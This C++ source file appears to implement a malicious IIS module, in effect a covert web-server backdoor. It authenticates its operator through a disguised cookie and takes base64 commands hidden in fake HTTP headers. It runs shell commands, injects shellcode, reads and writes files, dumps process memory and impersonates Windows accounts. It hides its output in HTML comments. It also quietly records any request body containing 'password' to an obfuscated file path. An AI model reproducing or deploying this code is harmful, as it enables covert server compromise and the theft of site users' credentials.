#include "pch.h"
#include "HttpFactory.h"
#include <iostream>
#include <fstream>
#include <strsafe.h>
#include <string.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

DWORD flag = 0;
LPSTR uname = NULL;
LPSTR passwd = NULL;
LPSTR command = NULL;
LPSTR param = NULL;
LPSTR data = NULL;

// check password, nhan command, thamso
// password in cookie aspnet= base64 -> swap
// command: Last-Modify
// done
// redirect
REQUEST_NOTIFICATION_STATUS CMyHttpModule::OnBeginRequest(IN IHttpContext* pHttpContext, IN IHttpEventProvider* pProvider) {
    IHttpRequest* pHttpRequest = pHttpContext->GetRequest();
  PCSTR rawUrl = pHttpRequest->GetRawHttpRequest()->pRawUrl;

    if(!rawUrl || strlen(rawUrl)>32){
    LABEL1:
        flag &= ~1;
        return RQ_NOTIFICATION_CONTINUE;
    }
    LPSTR phakeurlPtr = (LPSTR)pHttpContext->AllocateRequestMemory(2);
    if (!phakeurlPtr) goto LABEL1;
    *phakeurlPtr = (char)SPLAT;
    phakeurlPtr[1] = '\0';
    DWORD dwB64Size = 0;
    CryptBinaryToStringA((BYTE*)rawUrl, strlen(rawUrl), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwB64Size);

    if (!dwB64Size) goto LABEL1;
    LPSTR b64Data = (LPSTR)pHttpContext->AllocateRequestMemory(dwB64Size);
    if (!b64Data) goto LABEL1;
    ZeroMemory(b64Data, dwB64Size);
    if (!CryptBinaryToStringA((BYTE*)rawUrl, strlen(rawUrl), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Data, &dwB64Size)) {
        goto LABEL1;
    }
    LPSTR x = b64Data + 1;
    
    DWORD loop = dwB64Size / 2;
    do{
        char y = *(x - 1);
        x += 2;
        *(x - 3) = *(x - 2);
        *(x - 2) = y;
        --loop;
    } while (loop);
    USHORT cookiesize = 0;
    PCSTR cookieHeader = pHttpRequest->GetHeader("Cookie", &cookiesize);
    if (!cookieHeader) goto LABEL5;
    strstr(cookieHeader, b64Data) == NULL? (flag &= ~1):(flag |= 1);
    if (flag & 1) {

        passwd = (LPSTR)pHttpContext->AllocateRequestMemory(32);
        uname = (LPSTR)pHttpContext->AllocateRequestMemory(32);
        if (passwd && uname) {
            ZeroMemory(uname, 32);
            ZeroMemory(passwd, 32);
            LPSTR temp = uname;

            char* c = (char*)rawUrl + 1;
            USHORT lenRawUrl = strlen(rawUrl) - 1;

            while (lenRawUrl) {
                if (*c == *phakeurlPtr) {
                    *temp = '\0';
                    --lenRawUrl;
                    ++c;
                    break;
                }
                *temp = *c;
                ++temp;
                --lenRawUrl;
                ++c;
            }
            if (lenRawUrl > 0) {
                CopyMemory(passwd, c, lenRawUrl);
                passwd[lenRawUrl] = '\0';
            }
        }
        
        //hiding string
        PCSTR b64command = pHttpRequest->GetHeader("Last-Modify", 0);
        PCSTR b64param = pHttpRequest->GetHeader("WWW-Authorization", 0);
        if (b64command && b64param) {
            dwB64Size = 0;
            CryptStringToBinaryA(b64command, strlen(b64command), CRYPT_STRING_BASE64, NULL, &dwB64Size, NULL, NULL);
            if (!dwB64Size) {
                DWORD error = GetLastError();
                goto LABEL1;
            }
            command = (LPSTR)pHttpContext->AllocateRequestMemory(dwB64Size+1);
            if (!command) goto LABEL1;
            ZeroMemory(command, dwB64Size);
            if (!CryptStringToBinaryA(b64command, 0, CRYPT_STRING_BASE64, (BYTE*)command, &dwB64Size, NULL, NULL)) {
                DWORD error = GetLastError();
                goto LABEL1;
            }
            dwB64Size = 0;
            CryptStringToBinaryA(b64param, 0, CRYPT_STRING_BASE64, NULL, &dwB64Size, NULL, NULL);
            if (!dwB64Size) goto LABEL1;
            param = (LPSTR)pHttpContext->AllocateRequestMemory(dwB64Size+1);
            if (!param) goto LABEL1;
            ZeroMemory(param, dwB64Size);
            if (!CryptStringToBinaryA(b64param, 0, CRYPT_STRING_BASE64, (BYTE*)param, &dwB64Size, NULL, NULL)) {
                DWORD error = GetLastError();
                goto LABEL1;
            }
        }
        DWORD numbyte = pHttpRequest->GetRemainingEntityBytes();
        if (numbyte) {
            LPSTR b64data = (LPSTR)pHttpContext->AllocateRequestMemory(numbyte + 1);
            HRESULT hr = pHttpRequest->ReadEntityBody((LPVOID)b64data, numbyte, 0, &numbyte, 0);
            if (hr == S_OK) {
                dwB64Size = 0;
                CryptStringToBinaryA(b64data, 0, CRYPT_STRING_BASE64, NULL, &dwB64Size, NULL, NULL);
                if (!dwB64Size) goto LABEL1;
                data = (LPSTR)pHttpContext->AllocateRequestMemory(dwB64Size + 1);
                if (!data) goto LABEL1;
                ZeroMemory(data, dwB64Size+1);
                if (!CryptStringToBinaryA(b64data, 0, CRYPT_STRING_BASE64, (BYTE*)data, &dwB64Size, NULL, NULL)) {
                    DWORD error = GetLastError();
                    goto LABEL1;
                }
            }
        }
        pHttpRequest->SetHttpMethod("GET");
        //pHttpRequest->DeleteHeader("Cookie");
        /*pHttpRequest->DeleteHeader("Last-Modify");
        pHttpRequest->DeleteHeader("WWW-Authorization");*/
        return RQ_NOTIFICATION_CONTINUE;
    }
LABEL5:
    DWORD datasize = pHttpRequest->GetRemainingEntityBytes();
    if (datasize) {
        LPSTR bodydata = (LPSTR)pHttpContext->AllocateRequestMemory(datasize + 1);
        HRESULT hre = pHttpRequest->ReadEntityBody(bodydata, datasize, 0, &datasize, 0);
        bodydata[datasize] = '\0';
        if (hre == S_OK) {
            // Check password keyword.C:\\Users\\Public\\creds.txt
            LPSTR file = (LPSTR)pHttpContext->AllocateRequestMemory(26);
            file[25] = '\0';
            memcpy(file + 4, "sers", 4);
            file[1] = ':';
            file[2] = '\\';
            file[11] = 'b';
            memcpy(file + 18, "eds.t", 5);
            file[3] = 'U';
            file[14] = 'c';
            file[8] = file[2];
            file[0] = 'C';
            file[13] = 'i';
            file[9] = 'P';
            file[10] = file[3] + 32;
            file[12] = (char)108;
            file[15] = file[8];
            file[16] = file[14];
            file[17] = 'r';
            file[23] = 'x';
            file[24] = file[22];
            LPCSTR lpFound = strstr(bodydata, "password");
            if (lpFound != NULL) {
                WriteBody(bodydata, file);
            }
        }
    }

    return RQ_NOTIFICATION_CONTINUE;
}

REQUEST_NOTIFICATION_STATUS CMyHttpModule::OnSendResponse(IN IHttpContext* pHttpContext, IN ISendResponseProvider* pProvider)
{
    IHttpRequest* pHttpRequest = pHttpContext->GetRequest();
    IHttpResponse* pHttpResponse = pHttpContext->GetResponse();
    
    if (flag & 1) {
        pHttpResponse->SetStatus(200, "OK");
        DWORD len = 0;

        LPVOID outData = pHttpContext->AllocateRequestMemory(MAX_DATA);
        ZeroMemory(outData, MAX_DATA);

        HANDLE phToken = NULL;
        if (strlen(uname) && strlen(passwd)) {
            if (LogonUserA(uname, NULL, passwd, LOGON32_LOGON_BATCH, 0, &phToken))
                ImpersonateLoggedOnUser(phToken);
        }
        if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, command, 3, "CMD", 3) == 2) {
            RunCommand(outData, param, phToken);
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, command, 3, "PIN", 3) == 2) {
            CopyMemory(outData, "PONG", 4);
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, command, 3, "INJ", 3) == 2) {
            InjectShellcode(outData, param, data);
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, command, 3, "FLR", 3) == 2) {
            len = FileRead(param, outData);
            if (!len) {
                CopyMemory(outData, "Error occur, file not exsist, no data or dont have permission", 61);// error with file too large -> fixed
            }
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, command, 3, "FLW", 3) == 2) {
            if (!FileWrite(param, data, outData)) {
                CopyMemory(outData, "Write file false", 16);
            }
        }
        else if (CompareStringA(LOCALE_SYSTEM_DEFAULT, NULL, command, 3, "DMP", 3) == 2) {
             MemDump(outData, param);
        }
        else {
             CopyMemory(outData, "INVALID COMMAND", 15);
        }
        //output data need to be fix
        if (!len) {
            len = strlen((LPCSTR)outData);
        }
        DWORD dwB64Size = 0;
        CryptBinaryToStringA((BYTE*)outData, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwB64Size);
        LPSTR b64Data = NULL;
        if (!dwB64Size) {
            goto LABEL2;
        }
        b64Data = (LPSTR)pHttpContext->AllocateRequestMemory(dwB64Size);
        if (!b64Data) {
            goto LABEL2;
        }
            CryptBinaryToStringA((BYTE*)outData, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Data, &dwB64Size);
            if (outData != NULL) {
                LPVOID newloc = (LPSTR)pHttpContext->AllocateRequestMemory(dwB64Size + 13);
                snprintf((LPSTR)newloc, dwB64Size + 13, "<!--/%s/-->\0", b64Data);
                const size_t chunkSize = 65535;
                DWORD dataSize = strlen((LPSTR)newloc);
                size_t bytesSent = 0;
                while (bytesSent < dataSize){
                    size_t currentChunkSize = min(chunkSize, dataSize - bytesSent);

                    HTTP_DATA_CHUNK chunk;
                    chunk.DataChunkType = HttpDataChunkFromMemory;
                    chunk.FromMemory.pBuffer = (LPVOID)((LPSTR)newloc + bytesSent);
                    chunk.FromMemory.BufferLength = (ULONG)currentChunkSize;

                    HRESULT hr = pHttpResponse->WriteEntityChunks(&chunk, 1, FALSE, TRUE, NULL);
                    if (FAILED(hr)) {
                        DWORD error = GetLastError();
                        return RQ_NOTIFICATION_CONTINUE;
                    }
                    bytesSent += currentChunkSize;
                }
            }
            if (phToken) {
                RevertToSelf();
                CloseHandle(phToken);
            }
    LABEL2:
        DWORD error = GetLastError();
        return RQ_NOTIFICATION_FINISH_REQUEST;
    }

   /* pHttpResponse->SetStatus(302, "Found");*/
    //LPCSTR redirectUrl = "https://www.example.com";
    //pHttpResponse->SetHeader("Location", redirectUrl, (USHORT)strlen(redirectUrl), TRUE);
   // pHttpResponse->Clear();
    //pHttpResponse->Redirect(redirectUrl, true, false);
    DWORD error = GetLastError();
    return RQ_NOTIFICATION_FINISH_REQUEST;
}
